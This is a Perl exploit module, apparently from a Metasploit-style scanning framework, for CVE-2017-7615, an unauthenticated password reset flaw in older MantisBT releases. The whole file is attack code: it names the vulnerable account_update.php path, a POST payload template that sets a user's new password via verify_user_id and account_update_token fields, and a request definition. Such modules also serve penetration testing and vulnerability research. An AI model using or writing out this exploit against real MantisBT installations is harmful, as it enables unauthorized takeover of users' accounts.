package MANTISBT::MSF::MantisbtPasswordReset;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MantisbtPasswordReset";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2017-7615",
  DESCRIPTION => "

        MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.

      ",
  METHOD => "POST",
  MSF_MODULE => "mantisbt_password_reset",
  PATH => "account_update.php?",
  PATHS => ["login_page.php", "verify.php", "account_update.php", ""],
  PAYLOAD => "verify_user_id=__VERIFY_USER_ID__&account_update_token=__ACCOUNT_UPDATE_TOKEN__&realname=__REALNAME__&password=__PASSWORD__&password_confirm=__PASSWORD_CONFIRM__&",
  REFERENCES => [
    "https://mantisbt.org/bugs/view.php?id=22690",
    "http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt",
  ],
  VARIABLES => {
    'ACCOUNT_UPDATE_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Relative URI of MantisBT installation",
  VALUE => "/",
},
    'USERID' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD_CONFIRM' =>       { DESCRIPTION => "", VALUE => "" },
    'VERIFY_USER_ID' =>       { DESCRIPTION => "", VALUE => "" },
    'REALNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       {
  DESCRIPTION => "The new password to set (blank for random)",
  VALUE => "",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
